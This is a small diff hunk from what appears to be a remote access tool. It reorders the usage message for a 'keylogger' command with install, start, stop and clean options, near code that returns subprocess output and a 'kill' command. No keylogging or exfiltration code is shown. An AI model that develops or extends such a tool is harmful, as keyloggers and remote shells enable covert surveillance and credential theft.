@@ -95,7 +95,7 @@ def main():
                     results = results.stdout.read() + results.stderr.read()
                     
             else:
-                results = 'use keylogger start | stop | install | clean'
+                results = 'use keylogger install | start | stop | clean'
 
 
         elif cmd == 'kill':
